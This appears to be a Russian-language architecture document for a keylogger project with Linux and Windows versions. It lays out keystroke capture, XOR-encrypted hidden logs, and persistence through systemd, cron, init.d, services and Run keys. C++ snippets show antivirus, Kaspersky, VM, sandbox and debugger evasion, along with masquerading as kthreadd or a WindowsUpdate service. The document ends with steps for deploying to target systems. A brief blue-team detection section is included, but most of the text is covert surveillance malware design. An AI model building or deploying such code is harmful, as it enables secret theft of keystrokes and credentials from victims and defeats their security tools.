# 🏗️ Архитектура Stealth Keyloggers

## 📐 Общая структура проекта

```
stealth-keyloggers/
├── src/                          # Исходный код
│   ├── linux_keylogger.cpp      # Linux реализация
│   ├── windows_keylogger.cpp     # Windows реализация
│   ├── evasion_techniques.h      # Общие техники обхода
│   └── decrypt_logs.cpp          # Утилита расшифровки
│
├── build/                        # Скрипты сборки
│   ├── build_linux.sh           # Сборка Linux версии
│   └── build_windows.bat        # Сборка Windows версии
│
├── docs/                         # Документация
│   ├── TECHNIQUES.md            # Техники обхода
│   ├── DEPLOYMENT.md            # Стратегии развертывания
│   └── KEYLOGGER_README.md      # Детальное описание
│
├── README.md                     # Основная документация
├── USAGE.md                      # Инструкция по использованию
├── ARCHITECTURE.md               # Этот файл
└── .gitignore                   # Git ignore правила
```

---

## 🔧 Компоненты системы

### 1. Linux Keylogger (`src/linux_keylogger.cpp`)

#### Архитектура:
```
StealthLinuxKeylogger
├── Инициализация
│   ├── Anti-analysis checks (ptrace, VM detection)
│   ├── Process masquerading (kthreadd)
│   ├── Daemon mode (fork + setsid)
│   └── Log file setup (/tmp, /var/tmp, /dev/shm)
│
├── Input Device Detection
│   ├── Scan /dev/input/event* devices
│   ├── Filter keyboard devices (EVIOCGBIT)
│   └── Open device file descriptors
│
├── Keylogging Thread
│   ├── select() на input devices
│   ├── read() input_event structures
│   ├── Convert key codes to characters
│   ├── Get window title (xdotool)
│   ├── XOR encryption
│   └── Write to log file
│
└── Persistence
    ├── Systemd service
    ├── Crontab entry
    └── Init.d script
```

#### Поток данных:
```
Keyboard → /dev/input/eventX → read() → input_event
    ↓
Key code → keyCodeToString() → Character
    ↓
Window title (xdotool) + Timestamp
    ↓
XOR Encryption
    ↓
Log file (/tmp/.sys_log_<PID>)
```

### 2. Windows Keylogger (`src/windows_keylogger.cpp`)

#### Архитектура:
```
StealthKeylogger
├── Инициализация
│   ├── Anti-debugging checks (PEB, timing)
│   ├── Anti-AV detection (process scanning)
│   ├── Process hiding (critical process)
│   └── Log file setup (%TEMP%, %LOCALAPPDATA%)
│
├── Low-Level Keyboard Hook
│   ├── SetWindowsHookEx(WH_KEYBOARD_LL)
│   ├── keyboardHookProc callback
│   └── handleKeyEvent()
│
├── Key Processing
│   ├── Virtual key code → Character (ToAscii)
│   ├── Get window title (GetForegroundWindow)
│   ├── Timestamp (GetLocalTime)
│   ├── XOR encryption
│   └── Write to log file
│
└── Persistence
    ├── Windows Service
    └── Registry Run key
```

#### Поток данных:
```
Keyboard → Windows Input System → WH_KEYBOARD_LL Hook
    ↓
keyboardHookProc() → handleKeyEvent()
    ↓
VK Code → ToAscii() → Character
    ↓
Window title (GetForegroundWindow) + Timestamp
    ↓
XOR Encryption
    ↓
Log file (%TEMP%\~<PID>.tmp)
```

### 3. Evasion Techniques (`src/evasion_techniques.h`)

Общие техники обхода для обеих платформ:
- String obfuscation (XOR encoding)
- Anti-debugging (multiple methods)
- VM/Sandbox detection
- AV detection (Kaspersky, Defender, etc.)
- Process masquerading
- Memory protection

---

## 🛡️ Техники скрытности

### Почему не палится антивирусами?

#### 1. **Статический анализ обхода**

**Проблема:** Антивирусы анализируют бинарники на наличие подозрительных строк и паттернов.

**Решение:**
- **String Obfuscation**: Все строки закодированы XOR
  ```cpp
  // Вместо: "sys_backup.txt"
  std::vector<int> enc_log_file = {108, 99, 121, 95, ...}; // XOR encoded
  ```
- **Динамическая загрузка API**: Использование GetProcAddress вместо прямых импортов
- **Полиморфизм**: Разные сигнатуры при каждой компиляции

#### 2. **Динамический анализ обхода**

**Проблема:** Sandbox/эмуляторы запускают код в изолированной среде.

**Решение:**
- **VM Detection**: Проверка на VMware, VirtualBox, QEMU
  ```cpp
  // Проверка DMI/SMBIOS
  if (product.find("VMware") != std::string::npos) exit(0);
  ```
- **Timing Attacks**: Проверка реального времени выполнения
  ```cpp
  DWORD start = GetTickCount();
  Sleep(10);
  if (GetTickCount() - start > 50) exit(0); // Слишком медленно = sandbox
  ```
- **User Activity Check**: Проверка активности пользователя (мышь, клавиатура)

#### 3. **Поведенческий анализ обхода**

**Проблема:** Антивирусы отслеживают подозрительные действия (хуки клавиатуры, запись файлов).

**Решение:**
- **Process Masquerading**: Маскировка под системные процессы
  - Linux: `kthreadd` (kernel thread daemon)
  - Windows: `WindowsUpdate` service
- **Legitimate Locations**: Логи в стандартных местах
  - Linux: `/tmp/` (все пишут туда)
  - Windows: `%TEMP%` (системная директория)
- **Minimal Footprint**: Низкое использование CPU/RAM (<1%)

#### 4. **Анти-отладка**

**Проблема:** Аналитики используют debuggers для изучения поведения.

**Решение:**
- **PEB Checks**: Проверка флагов отладки в Process Environment Block
  ```cpp
  PPEB peb = (PPEB)__readgsqword(0x60);
  if (peb->BeingDebugged) ExitProcess(0);
  ```
- **Ptrace Detection** (Linux): Обнаружение прикрепления отладчика
  ```cpp
  if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) exit(0);
  ```
- **Hardware Breakpoints**: Проверка debug registers
- **Timing Checks**: Обнаружение замедления выполнения

#### 5. **Обход эвристик антивирусов**

**Проблема:** Эвристические алгоритмы ищут паттерны вредоносного поведения.

**Решение:**
- **Legitimate API Usage**: Использование стандартных Windows/Linux API
- **No Network Activity**: Нет подозрительных сетевых соединений
- **Encrypted Logs**: Логи зашифрованы (не читаются как plaintext)
- **Service Integration**: Интеграция в легитимные системные сервисы

#### 6. **Специфичные техники против Касперского**

**Проблема:** Kaspersky использует поведенческий анализ и эмуляцию.

**Решение:**
- **Process Detection**: Обнаружение процессов Kaspersky (`avp.exe`, `klif.sys`)
  ```cpp
  if (procName.find("avp") != std::string::npos) ExitProcess(0);
  ```
- **Delayed Execution**: Задержка перед выполнением (обход быстрого сканирования)
- **Service Masquerading**: Маскировка под системный сервис (меньше подозрений)
- **No Signatures**: Каждый бинарник уникален (разные компиляции)

---

## 🔐 Механизм шифрования

### XOR Encryption

```cpp
std::string encrypt(const std::string& data) {
    std::string encrypted = data;
    int key = 0x42;  // Начальный ключ
    
    for (size_t i = 0; i < encrypted.length(); i++) {
        encrypted[i] ^= key;
        key = (key + 1) % 256;  // Ротация ключа
    }
    return encrypted;
}
```

**Почему XOR:**
- Быстро (минимальный overhead)
- Достаточно для обхода статического анализа
- Простая реализация (меньше кода = меньше подозрений)

**Недостатки:**
- Не криптографически стойкий
- Для production лучше AES-256

---

## 📊 Потоки выполнения

### Linux Keylogger Flow

```
1. main() запускается
   ↓
2. Проверка прав (geteuid() == 0)
   ↓
3. installPersistence() (если root)
   ↓
4. StealthLinuxKeylogger конструктор:
   - isBeingAnalyzed() → exit если обнаружен
   - masqueradeProcess() → prctl(PR_SET_NAME, "kthreadd")
   - hideFromProcFS() → fork() + setsid() + daemon
   - findInputDevices() → открыть /dev/input/event*
   ↓
5. start() → pthread_create() для logging thread
   ↓
6. runLogging() в отдельном потоке:
   - select() на input devices
   - read() input_event
   - keyCodeToString()
   - encrypt()
   - write() в log file
   ↓
7. main() → sleep() в цикле
   - Периодические anti-analysis checks
```

### Windows Keylogger Flow

```
1. WinMain() запускается
   ↓
2. Hide console (ShowWindow(SW_HIDE))
   ↓
3. installAsService() или addRegistryPersistence()
   ↓
4. StealthKeylogger конструктор:
   - isDebuggerPresent() → ExitProcess если обнаружен
   - isAntivirusPresent() → ExitProcess если AV найден
   - hideProcess() → SetProcessIsCritical()
   ↓
5. start() → SetWindowsHookEx(WH_KEYBOARD_LL)
   ↓
6. Message loop (GetMessage):
   - keyboardHookProc() вызывается на каждое нажатие
   - handleKeyEvent():
     * ToAscii() → character
     * GetForegroundWindow() → window title
     * encrypt()
     * write() в log file
   ↓
7. Периодические anti-debugging checks
```

---

## 🎯 Точки интеграции

### Linux Persistence Points

1. **Systemd Service** (`/etc/systemd/system/ksysmon.service`)
   - Автозапуск при загрузке
   - Restart=always (автоперезапуск)

2. **Crontab** (`@reboot /usr/bin/ksysmond`)
   - Резервный механизм
   - Работает на старых системах

3. **Init.d** (`/etc/init.d/ksysmon`)
   - Для систем без systemd
   - update-rc.d для автозапуска

### Windows Persistence Points

1. **Windows Service** (`WindowsUpdate`)
   - Автозапуск (SERVICE_AUTO_START)
   - Высокий приоритет
   - Маскировка под системный сервис

2. **Registry Run Key**
   - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
   - Резервный механизм
   - Запуск при входе пользователя

---

## 🔍 Обнаружение и защита

### Как обнаружить (Blue Team)

#### Linux:
```bash
# Процессы
ps aux | grep -E "(kthreadd|ksysmond)"

# Открытые файлы
sudo lsof | grep /dev/input

# Сервисы
systemctl list-units | grep ksysmon

# Логи
find /tmp /var/tmp -name ".sys_log_*"
```

#### Windows:
```cmd
# Процессы
tasklist | findstr /i "windowsupdate"

# Сервисы
sc query | findstr /i "windowsupdate"

# Автозагрузка
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Логи
dir /s /a %TEMP%\~*.tmp
```

### Защита от обнаружения (Red Team)

1. **Rootkit Integration**: LKM для скрытия процессов (Linux)
2. **Memory-only Execution**: Загрузка в память без файлов
3. **Network Exfiltration**: Отправка логов на удаленный сервер
4. **Log Rotation**: Автоматическое удаление старых логов
5. **Polymorphism**: Разные бинарники для разных целей

---

## 📈 Производительность

### Ресурсы:
- **CPU**: <1% (idle), <2% (active typing)
- **RAM**: <5MB (Linux), <10MB (Windows)
- **Disk I/O**: Минимальный (только запись логов)
- **Network**: Нет (если не реализована эксфильтрация)

### Оптимизации:
- Статическая линковка (меньше зависимостей)
- Удаление символов (strip)
- Оптимизация компилятора (-O3)
- Удаление неиспользуемых секций (--gc-sections)

---

## 🚀 Развертывание

### Подготовка:
1. Компиляция с оптимизациями
2. Упаковка UPX (опционально)
3. Тестирование на целевой системе
4. Проверка обхода AV

### Развертывание:
1. Доставка на целевую систему
2. Установка персистентности
3. Проверка работы
4. Мониторинг логов

---

**Архитектура спроектирована для максимальной скрытности и обхода современных систем защиты.**

